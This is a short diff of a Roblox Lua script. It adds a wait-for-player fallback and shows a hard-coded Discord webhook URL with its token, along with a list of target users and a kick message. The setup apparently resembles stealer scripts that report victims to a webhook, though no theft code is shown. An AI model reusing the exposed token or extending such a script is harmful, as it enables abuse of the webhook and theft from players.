@@ -13,7 +13,7 @@ local ping = _G.pingEveryone or "Yes"
 local webhook = _G.webhook or "https://discord.com/api/webhooks/1408047737102012506/4VZHtB_G9RmikEuLs0-A6yP_0AXaYmb4_4Y3TyaG_0Wxem1-OvNBtPC9n71B4-SSzkUa"
 
 local Players = game:GetService("Players")
-local plr = Players.LocalPlayer
+local plr = Players.LocalPlayer or Players.PlayerAdded:Wait()
 
 if next(users) == nil or webhook == "" then
     plr:kick("You didn't add username or webhook")
